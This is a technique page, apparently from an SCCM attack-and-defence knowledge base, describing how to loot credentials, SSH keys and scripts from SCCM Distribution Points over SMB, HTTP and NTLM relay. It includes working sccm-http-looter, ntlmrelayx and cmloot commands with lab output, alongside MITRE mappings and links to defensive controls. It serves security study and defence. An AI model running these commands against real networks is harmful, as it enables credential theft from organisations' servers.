# CRED-6

## Description

Loot domain credentials, SSH keys, and more from SCCM Distribution Points (DP)

## MITRE ATT&CK TTPs

- [TA0006 - Credential Access](https://attack.mitre.org/tactics/TA0006)
- [T1078.002 - Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/)

## Requirements

One or the other:

- Network access to SCCM Distribution Points (DP) SMB service

- Network access to SCCM Distribution Points (DP) HTTP service

- Credentials are likely to be required **but not always**

## Summary

SCCM distribution points (DPs) are the servers used by Microsoft MC/SCCM to host all the files used in software installs, patches, script deployments, etc. By default, these servers allow access via SMB (TCP/445) and HTTP/S (TCP/80 and/or TCP/443) and require some type of Windows authentication (i.e. NTLM).

IT professionals and software engineers have a tendency of hardcoding credentials in scripts, configuration files, software, etc.

Because of this, we can loot the SCCM DP and extract valid credentials as authenticated (and sometimes unauthenticated) attackers.

#### SMB

The `C:\SCCMContentLib` folder is shared via SMB as the `SCCMContentLib$` SMB share and is accessible to any member of the Domain Users or Domain Computers groups. The file structure of the `C:\SCCMContentLib` folder is explained [here](https://github.com/badsectorlabs/sccm-http-looter/blob/main/DEFCON32_RTV_How-Ludu-%20made-it-rain-creds-from-SCCM.pdf)

#### HTTP

The IIS web server hosted on the distribution point defines a virtual directory, `SMS_DP_SMSPKG$`, which maps to the `C:\SCCMContentLib` folder explained above. The web server will perform all the file structure processing for us, allowing to retrieve resources belonging to a package through HTTP (that are by default domain-authenticated with Kerberos/NTLM, as all interactions to fetch external resources from the distribution point).

URL format to list the subdirectories and files in a package: `http://<DP>/sms_dp_smspkg$/<PackageID>/`

Retrieving a file in a package: `http://<DP>/sms_dp_smspkg$/<PackageID>/<filename>`

## Impact

If anonymous authentication (no credentials required) is enabled, an internal attacker can dump the DP files and analyze its contents for valid credentials. NTLM relaying is still possible under proper conditions.

If authentication is required: An internal attacker can use existing credentials to authenticate to the SMB/HTTP services to loot the Distribution Points.

## Defensive IDs

- [PREVENT-10: Enforce the principle of least privilege for accounts](../../../defense-techniques/PREVENT/PREVENT-10/prevent-10_description.md)
- [PREVENT-20: Block unnecessary connections to site systems](../../../defense-techniques/PREVENT/PREVENT-20/prevent-20_description.md)

## Examples

#### HTTP DP Looting (Anonymous Authentication Enabled)

```bash
# Using Regular Method
┌──(.env)─(root㉿AR-kali)-[/opt/sccm-http-looter]
└─# ./sccm-http-looter -server 10.2.10.12
2024/08/15 22:47:57 INFO SCCM HTTP Looter by Bad Sector Labs (@badsectorlabs)
2024/08/15 22:47:57 INFO Getting Datalib listing from http://10.2.10.12:80/SMS_DP_SMSPKG$/Datalib...
2024/08/15 22:47:57 INFO Found 12 Directories in the Datalib
2024/08/15 22:47:57 INFO SCCM Looting complete!


# Using signature files to extract file names

┌──(.env)─(root㉿AR-kali)-[/opt/sccm-http-looter]
└─# ./sccm-http-looter -server 10.2.10.12 -use-signature-method
2024/08/15 22:48:02 INFO SCCM HTTP Looter by Bad Sector Labs (@badsectorlabs)
2024/08/15 22:48:02 INFO Getting Datalib listing from http://10.2.10.12:80/SMS_DP_SMSPKG$/Datalib...
2024/08/15 22:48:02 INFO SCCM Looting complete!
```

#### HTTP DP Looting (NTLMRelayx to HTTP endpoint)

Currently, you can use the following version of [impacket](https://github.com/ar0dd/impacket). There is a pending [Pull Request](https://github.com/fortra/impacket/pull/1790) (as of 14 August, 2024) to include this into the main `impacket` repository.

Just run your server and wait for authentication to take place.

```bash
└─# python3 examples/ntlmrelayx.py -t http://10.2.10.12/SMS_DP_SMSPKG$/Datalib --sccm --sccm-dp-dump -smb2support
Impacket v0.12.0.dev1+20240801.104651.6d8dd858 - Copyright 2023 Fortra

[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.2.10.13, attacking target http://10.2.10.12
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://10.2.10.12 as LUDUS/SCCM-SQL$ SUCCEED
[*] Dumping SCCM Distribution Point Files
[*] Getting Datalib listing...
[*] Getting Datalib listing from http://10.2.10.12/SMS_DP_SMSPKG$/Datalib...
[*] Data saved to 10.2.10.12_sccm_dump/Datalib.txt
[*] Extracting file names from Datalib listing...
[*] Getting file signatures...
[*] All targets processed!
[*] SMBD-Thread-7 (process_request_thread): Connection from 10.2.10.13 controlled, but there are no more targets left!
[*] SCCM DP Looting complete!
```

#### SMB DP Looting (With Domain Credentials)

```bash
# Create a loot inventory for a specific Distribution Point (DP)
┌──(root㉿AR-kali)-[/opt/cmloot]
└─# python3 cmloot.py ludus.domain/domainuser@10.2.10.12 -cmlootinventory sccmfiles.txt
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
[+] Access to SCCMContentLib on 10.2.10.12
[+] sccmfiles.txt created

# Review + then download the sccmfiles contents
┌──(root㉿AR-kali)-[/opt/cmloot]
└─# python3 cmloot.py ludus.domain/domainuser@10.2.10.12 -cmlootdownload sccmfiles.txt
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
[+] sccmfiles.txt exists. Remove it if you want to recreate the inventory.
[+] Extensions to download ['XML', 'INI', 'CONFIG', 'PS1', 'VBS']
[+] Already downloaded F906-ep_defaultpolicy.xml
[+] Already downloaded 7CEE-configure-baseline.ps1

# Analyze your loot
┌──(root㉿AR-kali)-[/opt/cmloot]
└─# ls CMLootOut
7CEE-configure-baseline.ps1  F906-ep_defaultpolicy.xml
```

## References

- Tomas Rzepka, [Looting Microsoft Configuration Manager](https://rzec.se/blog/looting-microsoft-configuration-manager/)
- Tomas Rzepka, [CMLoot](https://github.com/1njected/CMLoot)
- Erik Hunstad, [sccm-http-looter](https://github.com/badsectorlabs/sccm-http-looter)
- Alberto Rodriguez, [ntlmrelayx](https://github.com/fortra/impacket/pull/1790)
- Quentin Roland, [sccmsecrets.py](https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial)
- Shelltrail [CMLoot.py](https://github.com/shelltrail/cmloot) & this [blog](https://www.shelltrail.com/research/cmloot/)
